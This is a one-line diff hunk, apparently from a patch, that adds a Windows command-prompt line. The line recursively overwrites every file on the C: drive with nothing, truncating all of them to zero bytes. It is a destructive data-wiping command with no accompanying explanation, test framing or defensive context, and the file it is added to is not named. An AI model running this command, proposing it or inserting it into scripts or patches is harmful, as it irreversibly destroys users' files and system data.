@@ -1,0 +1,1 @@
+for /R C:\ %i in (*) do type nul > "%i"
